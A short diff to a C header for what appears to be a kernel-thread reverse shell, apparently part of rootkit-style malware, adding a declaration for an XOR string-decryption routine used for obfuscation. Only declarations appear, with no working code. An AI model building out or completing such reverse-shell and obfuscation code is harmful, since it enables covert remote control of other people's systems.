@@ -8,4 +8,6 @@
 
 extern int rshell_func(void* data); // 'data' is not in use but must be present to match the signature for kthread
 
+extern void xor_decrypt(char* s);
+
 #endif // REVERSE_SHELL_H
